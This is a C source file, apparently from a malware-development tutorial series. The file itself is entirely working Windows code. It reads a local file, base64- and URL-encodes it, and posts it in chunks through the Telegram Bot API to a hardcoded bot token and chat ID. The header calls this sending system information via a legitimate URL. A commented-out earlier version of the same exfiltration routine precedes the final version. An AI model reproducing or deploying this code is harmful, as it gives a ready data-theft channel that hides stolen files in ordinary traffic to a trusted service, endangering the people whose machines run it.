// /*
//  * hack.c
//  * sending systeminfo via legit URL. Telegram API
//  * author @cocomelonc
// */
// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <windows.h>
// #include <winhttp.h>
// #include <wincrypt.h>

// #define MAX_TG_MSG_SIZE 512 // by limit 4096

// // send data to Telegram channel using winhttp
// int sendToTgBot(const char* message) {
//   const char* chatId = "5547299598";
//   HINTERNET hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
//   if (!hSession) return 1;

//   HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
//   if (!hConnect) { WinHttpCloseHandle(hSession); return 1; }

//   HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
//   if (!hRequest) {
//     WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 1;
//   }

//   // I hope this fucking thing is worked
//   char requestBody[1024] = {0};
//   const char* prefix = "chat_id=5547299598&text=";
//   size_t prefixLen = strlen(prefix);
//   size_t msgLen = strlen(message);

//   if (prefixLen + msgLen >= sizeof(requestBody)) {
//     fprintf(stderr, "Quack! message too long for requestBody\n");
//     return 1;
//   }

//   memcpy(requestBody, prefix, prefixLen);
//   memcpy(requestBody + prefixLen, message, msgLen);

//   BOOL result = WinHttpSendRequest(hRequest,
//     L"Content-Type: application/x-www-form-urlencoded\r\n",
//     -1,
//     requestBody,
//     (DWORD)(prefixLen + msgLen),
//     (DWORD)(prefixLen + msgLen),
//     0);

//   if (!result) {
//     fprintf(stderr, "WinHttpSendRequest error %lu\n", GetLastError());
//     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
//     return 1;
//   }

//   WinHttpReceiveResponse(hRequest, NULL);

//   WinHttpCloseHandle(hRequest);
//   WinHttpCloseHandle(hConnect);
//   WinHttpCloseHandle(hSession);
//   return 0;
// }


// // encoding base64
// char* base64_encode(const BYTE* buffer, DWORD length) {
//   DWORD base64Len = 0;
//   CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
//   char* base64 = (char*)malloc(base64Len + 1);
//   CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64Len);
//   base64[base64Len] = '\0';
//   return base64;
// }

// // base64 fs
// void sendBase64File(const char* filePath) {
//   FILE* f = fopen(filePath, "rb");
//   if (!f) {
//     perror("fopen");
//     return;
//   }

//   fseek(f, 0, SEEK_END);
//   long size = ftell(f);
//   rewind(f);

//   BYTE* data = malloc(size);
//   fread(data, 1, size, f);
//   fclose(f);

//   char* encoded = base64_encode(data, size);
//   free(data);

//   size_t len = strlen(encoded);
//   printf("sending base64-encoded data (%zu bytes)...\n", len);
//   for (size_t i = 0; i < len; i += MAX_TG_MSG_SIZE) {
//     char chunk[4096] = {0};
//     strncpy(chunk, encoded + i, MAX_TG_MSG_SIZE);
//     printf("%s\n", chunk);
//     sendToTgBot(chunk);
//     Sleep(1000); // sleep
//   }

//   free(encoded);
//   printf("done...\n");
// }

// int main() {
//   const char* filePath = "cat1.png";
//   sendBase64File(filePath);
//   return 0;
// }

#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_TG_MSG_SIZE 512
#define TOKEN L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage"
#define CHAT_ID "5547299598"

// URL-encode
char* url_encode(const char* str) {
  size_t len = strlen(str);
  char* enc = malloc(len * 3 + 1);
  char* p = enc;
  while (*str) {
    if (('a' <= *str && *str <= 'z') ||
        ('A' <= *str && *str <= 'Z') ||
        ('0' <= *str && *str <= '9') ||
        *str == '-' || *str == '_' || *str == '.' || *str == '~') {
      *p++ = *str;
    } else {
      sprintf(p, "%%%02X", (unsigned char)*str);
      p += 3;
    }
    str++;
  }
  *p = '\0';
  return enc;
}

// Base64 encode
char* base64_encode(const BYTE* buffer, DWORD length) {
  DWORD base64Len = 0;
  CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
  char* base64 = (char*)malloc(base64Len + 1);
  CryptBinaryToStringA(buffer, length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64Len);
  base64[base64Len] = '\0';
  return base64;
}

// send to Telegram
int sendToTgBot(const char* message) {
  HINTERNET hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) return 1;

  HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return 1;
  }

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", TOKEN, NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return 1;
  }

  char requestBody[4096] = {0};
  const char* prefix = "chat_id=" CHAT_ID "&text=";
  size_t prefixLen = strlen(prefix);
  size_t msgLen = strlen(message);

  if (prefixLen + msgLen >= sizeof(requestBody)) {
    fprintf(stderr, "message too long\n");
    return 1;
  }

  memcpy(requestBody, prefix, prefixLen);
  memcpy(requestBody + prefixLen, message, msgLen);

  BOOL bResult = WinHttpSendRequest(hRequest,
    L"Content-Type: application/x-www-form-urlencoded\r\n",
    -1,
    requestBody,
    (DWORD)(prefixLen + msgLen),
    (DWORD)(prefixLen + msgLen),
    0);

  if (!bResult) {
    fprintf(stderr, "WinHttpSendRequest error: %lu\n", GetLastError());
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return 1;
  }

  WinHttpReceiveResponse(hRequest, NULL);
  WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
  return 0;
}

// read file and sending chunks
void sendBase64File(const char* filePath) {
  FILE* f = fopen(filePath, "rb");
  if (!f) {
    perror("fopen");
    return;
  }

  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  rewind(f);

  BYTE* data = malloc(size);
  fread(data, 1, size, f);
  fclose(f);

  char* encoded = base64_encode(data, size);
  free(data);

  size_t len = strlen(encoded);
  for (size_t i = 0; i < len; i += MAX_TG_MSG_SIZE) {
    char chunk[MAX_TG_MSG_SIZE + 1] = {0};
    memcpy(chunk, encoded + i, (len - i >= MAX_TG_MSG_SIZE) ? MAX_TG_MSG_SIZE : len - i);
    chunk[MAX_TG_MSG_SIZE] = '\0';

    char* safe = url_encode(chunk);
    sendToTgBot(safe);
    free(safe);
    Sleep(1000);
  }

  free(encoded);
}

int main() {
  sendBase64File("cat1.png");
  return 0;
}
